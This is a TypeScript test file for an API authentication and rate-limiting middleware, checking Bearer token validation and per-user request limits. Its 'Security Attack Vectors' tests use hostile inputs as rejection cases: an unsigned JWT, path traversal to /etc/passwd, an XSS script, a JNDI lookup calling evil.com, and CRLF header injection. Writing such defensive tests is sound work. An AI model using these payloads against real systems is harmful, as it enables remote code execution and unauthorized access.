/**
 * Authentication Middleware Tests
 *
 * Critical security tests for API authentication and rate limiting that protects:
 * - Bearer token validation and user identity verification
 * - Rate limiting to prevent API abuse and DoS attacks
 * - Authorization header parsing and security validation
 * - Supabase auth integration and error handling
 * - Per-user rate tracking with time window management
 * - Protection against token manipulation and bypass attempts
 *
 * Business Impact: Unauthorized API access, DDoS attacks, data breaches
 */

import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest'
import { VercelRequest } from '@vercel/node'

// Mock the Supabase client creation using a factory
vi.mock('@supabase/supabase-js', () => ({
  createClient: vi.fn(() => ({
    auth: {
      getUser: vi.fn()
    }
  }))
}))

// Set up environment variables for the module
process.env.SUPABASE_URL = 'https://test.supabase.co'
process.env.SUPABASE_ANON_KEY = 'test-anon-key'
process.env.VITE_SUPABASE_URL = 'https://test.supabase.co'
process.env.VITE_SUPABASE_ANON_KEY = 'test-anon-key'

// Import after mocks
import { authenticate, checkUserRateLimit, AuthenticatedRequest } from '../middleware'
import { createClient } from '@supabase/supabase-js'

describe('Authentication Middleware', () => {
  let mockGetUser: any

  const createMockRequest = (headers: Record<string, string> = {}): VercelRequest => ({
    headers,
    method: 'GET',
    url: '/api/test',
    query: {},
    body: {}
  } as VercelRequest)

  beforeEach(() => {
    vi.clearAllMocks()
    vi.useFakeTimers()
    vi.setSystemTime(new Date('2023-12-01T10:00:00.000Z'))

    // Get the mock function from the mocked createClient
    const mockCreateClient = createClient as any
    const mockSupabase = mockCreateClient()
    mockGetUser = mockSupabase.auth.getUser

    // Set up default successful response for getUser
    mockGetUser.mockResolvedValue({
      data: {
        user: {
          id: 'test-user-id',
          email: 'test@example.com'
        }
      },
      error: null
    })
  })

  afterEach(() => {
    vi.resetAllMocks()
    vi.useRealTimers()
  })

  describe('authenticate', () => {

    const validUser = {
      id: 'user123',
      email: 'test@example.com',
      aud: 'authenticated',
      role: 'authenticated'
    }

    describe('Valid Authentication', () => {
      it('should authenticate valid Bearer token successfully', async () => {
        const req = createMockRequest({
          authorization: 'Bearer valid.jwt.token'
        })

        mockGetUser.mockResolvedValue({
          data: { user: validUser },
          error: null
        })

        const result = await authenticate(req)

        expect(mockGetUser).toHaveBeenCalledWith('valid.jwt.token')
        expect(result).toEqual({
          user: validUser,
          error: undefined
        })
      })

      it('should extract user ID and email correctly', async () => {
        const req = createMockRequest({
          authorization: 'Bearer user.token.here'
        })

        const userData = {
          id: 'user456',
          email: 'user@example.com',
          aud: 'authenticated'
        }

        mockGetUser.mockResolvedValue({
          data: { user: userData },
          error: null
        })

        const result = await authenticate(req)

        expect(result.user).toEqual(userData)
        expect(result.error).toBeUndefined()
      })

      it('should handle users without email', async () => {
        const req = createMockRequest({
          authorization: 'Bearer anonymous.token'
        })

        const anonymousUser = {
          id: 'anon123',
          aud: 'authenticated'
          // No email property
        }

        mockGetUser.mockResolvedValue({
          data: { user: anonymousUser },
          error: null
        })

        const result = await authenticate(req)

        expect(result.user).toEqual(anonymousUser)
        expect(result.user?.email).toBeUndefined()
      })
    })

    describe('Invalid Authentication', () => {
      it('should reject request without authorization header', async () => {
        const req = createMockRequest({})

        const result = await authenticate(req)

        expect(result).toEqual({
          user: null,
          error: 'Missing or invalid authorization header'
        })
        expect(mockGetUser).not.toHaveBeenCalled()
      })

      it('should reject authorization header without Bearer prefix', async () => {
        const req = createMockRequest({
          authorization: 'Basic dXNlcjpwYXNz' // Basic auth
        })

        const result = await authenticate(req)

        expect(result).toEqual({
          user: null,
          error: 'Missing or invalid authorization header'
        })
        expect(mockGetUser).not.toHaveBeenCalled()
      })

      it('should reject empty Bearer token', async () => {
        const req = createMockRequest({
          authorization: 'Bearer '
        })

        mockGetUser.mockResolvedValue({
          data: { user: null },
          error: { message: 'Invalid token' }
        })

        const result = await authenticate(req)

        expect(mockGetUser).toHaveBeenCalledWith('')
        expect(result).toEqual({
          user: null,
          error: 'Invalid or expired token'
        })
      })

      it('should reject malformed Bearer token', async () => {
        const req = createMockRequest({
          authorization: 'Bearer invalid-token-format'
        })

        mockGetUser.mockResolvedValue({
          data: { user: null },
          error: { message: 'Invalid JWT format' }
        })

        const result = await authenticate(req)

        expect(result).toEqual({
          user: null,
          error: 'Invalid or expired token'
        })
      })

      it('should reject expired tokens', async () => {
        const req = createMockRequest({
          authorization: 'Bearer expired.jwt.token'
        })

        mockGetUser.mockResolvedValue({
          data: { user: null },
          error: { message: 'Token expired' }
        })

        const result = await authenticate(req)

        expect(result).toEqual({
          user: null,
          error: 'Invalid or expired token'
        })
      })

      it('should handle Supabase auth service errors', async () => {
        const req = createMockRequest({
          authorization: 'Bearer valid.token.format'
        })

        mockGetUser.mockResolvedValue({
          data: { user: null },
          error: { message: 'Service unavailable' }
        })

        const result = await authenticate(req)

        expect(result).toEqual({
          user: null,
          error: 'Invalid or expired token'
        })
      })

      it('should handle null user response from Supabase', async () => {
        const req = createMockRequest({
          authorization: 'Bearer valid.format.token'
        })

        mockGetUser.mockResolvedValue({
          data: { user: null },
          error: null
        })

        const result = await authenticate(req)

        expect(result).toEqual({
          user: null,
          error: 'Invalid or expired token'
        })
      })
    })

    describe('Security Attack Vectors', () => {
      it('should handle JWT token manipulation attempts', async () => {
        const maliciousTokens = [
          'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMn0.', // None algorithm
          'Bearer ../../../etc/passwd', // Path traversal attempt
          'Bearer <script>alert("xss")</script>', // XSS attempt
          'Bearer ${jndi:ldap://evil.com/a}', // JNDI injection
          'Bearer ' + 'A'.repeat(10000) // Extremely long token
        ]

        for (const authHeader of maliciousTokens) {
          const req = createMockRequest({ authorization: authHeader })

          mockGetUser.mockResolvedValue({
            data: { user: null },
            error: { message: 'Invalid token' }
          })

          const result = await authenticate(req)

          expect(result.user).toBeNull()
          expect(result.error).toBe('Invalid or expired token')
        }
      })

      it('should handle authorization header injection attempts', async () => {
        const injectionAttempts = [
          'Bearer token\\r\\nHost: evil.com',
          'Bearer token\\nX-Admin: true',
          'Bearer token\r\nAuthorization: Bearer admin-token',
          'Bearer token\0admin'
        ]

        for (const authHeader of injectionAttempts) {
          const req = createMockRequest({ authorization: authHeader })

          mockGetUser.mockResolvedValue({
            data: { user: null },
            error: { message: 'Invalid token format' }
          })

          const result = await authenticate(req)

          expect(result.user).toBeNull()
        }
      })

      it('should handle network failures and Supabase unavailability', async () => {
        const req = createMockRequest({
          authorization: 'Bearer valid.token.format'
        })

        mockGetUser.mockRejectedValue(new Error('Network timeout'))

        const consoleSpy = vi.spyOn(console, 'error').mockImplementation(() => {})

        const result = await authenticate(req)

        expect(result).toEqual({
          user: null,
          error: 'Authentication failed'
        })
        expect(consoleSpy).toHaveBeenCalledWith('Authentication error:', expect.any(Error))

        consoleSpy.mockRestore()
      })

      it('should handle malformed Supabase responses', async () => {
        const req = createMockRequest({
          authorization: 'Bearer valid.token.format'
        })

        // Mock malformed response
        mockGetUser.mockResolvedValue({
          data: {}, // Missing user property
          error: null
        })

        const result = await authenticate(req)

        expect(result).toEqual({
          user: null,
          error: 'Invalid or expired token'
        })
      })

      it('should prevent timing attacks through consistent response times', async () => {
        const requests = [
          createMockRequest({}), // No auth header
          createMockRequest({ authorization: 'Basic test' }), // Wrong auth type
          createMockRequest({ authorization: 'Bearer invalid' }) // Invalid token
        ]

        const startTime = Date.now()

        for (const req of requests) {
          mockGetUser.mockResolvedValue({
            data: { user: null },
            error: { message: 'Invalid' }
          })

          await authenticate(req)
        }

        // All should complete quickly without revealing timing differences
        const endTime = Date.now()
        expect(endTime - startTime).toBeLessThan(100)
      })
    })

    describe('Environment and Configuration', () => {
      it('should handle missing environment variables gracefully', async () => {
        // This would be tested at module load time, but we can test runtime behavior
        const req = createMockRequest({
          authorization: 'Bearer valid.token'
        })

        mockGetUser.mockRejectedValue(new Error('Invalid URL'))

        const consoleSpy = vi.spyOn(console, 'error').mockImplementation(() => {})

        const result = await authenticate(req)

        expect(result.user).toBeNull()
        expect(result.error).toBe('Authentication failed')

        consoleSpy.mockRestore()
      })

      it('should handle case-insensitive Bearer prefix', async () => {
        const req = createMockRequest({
          authorization: 'bearer lowercase.token'
        })

        const result = await authenticate(req)

        // Should reject because Bearer must be capitalized
        expect(result).toEqual({
          user: null,
          error: 'Missing or invalid authorization header'
        })
      })

      it('should handle whitespace in authorization header', async () => {
        const req = createMockRequest({
          authorization: '  Bearer   token.with.spaces  '
        })

        const result = await authenticate(req)

        // Should reject due to leading whitespace
        expect(result).toEqual({
          user: null,
          error: 'Missing or invalid authorization header'
        })
      })
    })
  })

  describe('checkUserRateLimit', () => {
    beforeEach(() => {
      // Clear the rate limit store between tests
      const userRateLimitStore = (global as any).userRateLimitStore
      if (userRateLimitStore) {
        userRateLimitStore.clear()
      }
    })

    describe('Rate Limit Enforcement', () => {
      it('should allow requests within rate limit', () => {
        const userId = 'user123'
        const limit = 5
        const windowMs = 60000 // 1 minute

        // First 5 requests should be allowed
        for (let i = 0; i < limit; i++) {
          const allowed = checkUserRateLimit(userId, limit, windowMs)
          expect(allowed).toBe(true)
        }
      })

      it('should reject requests exceeding rate limit', () => {
        const userId = 'user456'
        const limit = 3
        const windowMs = 60000

        // Use up the rate limit
        for (let i = 0; i < limit; i++) {
          checkUserRateLimit(userId, limit, windowMs)
        }

        // Next request should be rejected
        const allowed = checkUserRateLimit(userId, limit, windowMs)
        expect(allowed).toBe(false)
      })

      it('should track rate limits per user independently', () => {
        const user1 = 'user1'
        const user2 = 'user2'
        const limit = 2
        const windowMs = 60000

        // User1 hits rate limit
        checkUserRateLimit(user1, limit, windowMs)
        checkUserRateLimit(user1, limit, windowMs)
        const user1Blocked = checkUserRateLimit(user1, limit, windowMs)

        // User2 should still be allowed
        const user2Allowed = checkUserRateLimit(user2, limit, windowMs)

        expect(user1Blocked).toBe(false)
        expect(user2Allowed).toBe(true)
      })

      it('should reset rate limit after time window expires', () => {
        const userId = 'user789'
        const limit = 2
        const windowMs = 60000 // 1 minute

        // Hit rate limit
        checkUserRateLimit(userId, limit, windowMs)
        checkUserRateLimit(userId, limit, windowMs)
        expect(checkUserRateLimit(userId, limit, windowMs)).toBe(false)

        // Advance time past window
        vi.advanceTimersByTime(windowMs + 1000)

        // Should be allowed again
        expect(checkUserRateLimit(userId, limit, windowMs)).toBe(true)
      })

      it('should handle concurrent requests correctly', () => {
        const userId = 'concurrent-user'
        const limit = 3
        const windowMs = 60000

        // Simulate concurrent requests
        const results = []
        for (let i = 0; i < 5; i++) {
          results.push(checkUserRateLimit(userId, limit, windowMs))
        }

        // First 3 should be allowed, last 2 should be rejected
        expect(results).toEqual([true, true, true, false, false])
      })
    })

    describe('Configuration and Edge Cases', () => {
      it('should use default rate limit values', () => {
        const userId = 'default-user'

        // Default is 10 requests per 60 seconds
        for (let i = 0; i < 10; i++) {
          expect(checkUserRateLimit(userId)).toBe(true)
        }

        expect(checkUserRateLimit(userId)).toBe(false)
      })

      it('should handle zero rate limit', () => {
        const userId = 'zero-limit-user'
        const limit = 0

        const allowed = checkUserRateLimit(userId, limit, 60000)
        expect(allowed).toBe(false)
      })

      it('should handle negative rate limit', () => {
        const userId = 'negative-limit-user'
        const limit = -1

        const allowed = checkUserRateLimit(userId, limit, 60000)
        expect(allowed).toBe(false)
      })

      it('should handle very small time windows', () => {
        const userId = 'small-window-user'
        const limit = 5
        const windowMs = 1 // 1 millisecond

        // Should allow request
        expect(checkUserRateLimit(userId, limit, windowMs)).toBe(true)

        // Advance time to reset window
        vi.advanceTimersByTime(2)

        // Should allow again
        expect(checkUserRateLimit(userId, limit, windowMs)).toBe(true)
      })

      it('should handle very large time windows', () => {
        const userId = 'large-window-user'
        const limit = 2
        const windowMs = 86400000 // 24 hours

        // Hit rate limit
        checkUserRateLimit(userId, limit, windowMs)
        checkUserRateLimit(userId, limit, windowMs)
        expect(checkUserRateLimit(userId, limit, windowMs)).toBe(false)

        // Even after 1 hour, should still be blocked
        vi.advanceTimersByTime(3600000) // 1 hour
        expect(checkUserRateLimit(userId, limit, windowMs)).toBe(false)
      })

      it('should handle empty or invalid user IDs', () => {
        const invalidIds = ['', null, undefined, 0, false]

        for (const invalidId of invalidIds) {
          const allowed = checkUserRateLimit(invalidId as string, 5, 60000)
          // Should handle gracefully without crashing
          expect(typeof allowed).toBe('boolean')
        }
      })

      it('should handle extremely long user IDs', () => {
        const longUserId = 'a'.repeat(10000)

        expect(checkUserRateLimit(longUserId, 3, 60000)).toBe(true)
        expect(checkUserRateLimit(longUserId, 3, 60000)).toBe(true)
        expect(checkUserRateLimit(longUserId, 3, 60000)).toBe(true)
        expect(checkUserRateLimit(longUserId, 3, 60000)).toBe(false)
      })
    })

    describe('Memory Management and Performance', () => {
      it('should handle many unique users without memory leaks', () => {
        const limit = 5
        const windowMs = 60000

        // Create many unique users
        for (let i = 0; i < 1000; i++) {
          const userId = `user${i}`
          checkUserRateLimit(userId, limit, windowMs)
        }

        // Should still function correctly
        expect(checkUserRateLimit('new-user', limit, windowMs)).toBe(true)
      })

      it('should clean up expired entries implicitly', () => {
        const userId = 'cleanup-user'
        const limit = 3
        const windowMs = 1000 // 1 second

        // Create entry
        checkUserRateLimit(userId, limit, windowMs)

        // Advance time past window
        vi.advanceTimersByTime(windowMs + 1000)

        // Access should create new entry (implicit cleanup)
        expect(checkUserRateLimit(userId, limit, windowMs)).toBe(true)
      })

      it('should perform well under high load', () => {
        const userId = 'high-load-user'
        const limit = 1000
        const windowMs = 60000

        const startTime = Date.now()

        // Make many requests
        for (let i = 0; i < 500; i++) {
          checkUserRateLimit(userId, limit, windowMs)
        }

        const endTime = Date.now()

        // Should complete quickly (under 50ms)
        expect(endTime - startTime).toBeLessThan(50)
      })
    })

    describe('Security Attack Scenarios', () => {
      it('should prevent rate limit bypass through user ID manipulation', () => {
        const baseUserId = 'user123'
        const manipulatedIds = [
          'user123',
          'User123', // Case variation
          'user123 ', // Trailing space
          ' user123', // Leading space
          'user123\n', // Newline
          'user123\t', // Tab
          'user123\0' // Null byte
        ]

        const limit = 1
        const windowMs = 60000

        // Each manipulation should be treated as separate user
        // (or should they? This depends on security requirements)
        for (const userId of manipulatedIds) {
          const allowed = checkUserRateLimit(userId, limit, windowMs)
          expect(allowed).toBe(true) // First request for each "user"
        }
      })

      it('should handle denial of service through memory exhaustion', () => {
        const limit = 1
        const windowMs = 60000

        // Try to exhaust memory with many unique user IDs
        for (let i = 0; i < 10000; i++) {
          const uniqueUserId = `dos-user-${i}-${Math.random()}`
          checkUserRateLimit(uniqueUserId, limit, windowMs)
        }

        // System should still be responsive
        expect(checkUserRateLimit('normal-user', limit, windowMs)).toBe(true)
      })

      it('should handle race conditions in concurrent access', () => {
        const userId = 'race-user'
        const limit = 1
        const windowMs = 60000

        // Simulate race condition by calling simultaneously
        const promises = Array.from({ length: 10 }, () =>
          Promise.resolve(checkUserRateLimit(userId, limit, windowMs))
        )

        return Promise.all(promises).then(results => {
          // Exactly one should be allowed
          const allowedCount = results.filter(Boolean).length
          expect(allowedCount).toBe(1)
        })
      })

      it('should maintain consistency during time transitions', () => {
        const userId = 'transition-user'
        const limit = 2
        const windowMs = 1000

        // Use up rate limit
        checkUserRateLimit(userId, limit, windowMs)
        checkUserRateLimit(userId, limit, windowMs)
        expect(checkUserRateLimit(userId, limit, windowMs)).toBe(false)

        // Advance time to just before reset
        vi.advanceTimersByTime(windowMs - 1)
        expect(checkUserRateLimit(userId, limit, windowMs)).toBe(false)

        // Advance past reset point
        vi.advanceTimersByTime(2)
        expect(checkUserRateLimit(userId, limit, windowMs)).toBe(true)
      })
    })
  })

  describe('Integration Testing', () => {
    it('should work together in realistic API scenario', async () => {
      const req = createMockRequest({
        authorization: 'Bearer valid.user.token'
      })

      const user = { id: 'api-user-123', email: 'api@example.com' }
      mockGetUser.mockResolvedValue({
        data: { user },
        error: null
      })

      // Authenticate user
      const authResult = await authenticate(req)
      expect(authResult.user).toEqual(user)

      // Check rate limit
      const rateLimitOk = checkUserRateLimit(user.id, 5, 60000)
      expect(rateLimitOk).toBe(true)

      // Subsequent requests
      for (let i = 0; i < 4; i++) {
        expect(checkUserRateLimit(user.id, 5, 60000)).toBe(true)
      }

      // Should be rate limited now
      expect(checkUserRateLimit(user.id, 5, 60000)).toBe(false)
    })

    it('should handle authentication failure and rate limiting together', async () => {
      const req = createMockRequest({
        authorization: 'Bearer invalid.token'
      })

      mockGetUser.mockResolvedValue({
        data: { user: null },
        error: { message: 'Invalid token' }
      })

      // Authentication should fail
      const authResult = await authenticate(req)
      expect(authResult.user).toBeNull()

      // Rate limiting should still work for anonymous/failed requests
      // (Using IP or other identifier in real scenarios)
      const anonymousId = 'anonymous-request'
      expect(checkUserRateLimit(anonymousId, 3, 60000)).toBe(true)
    })
  })
})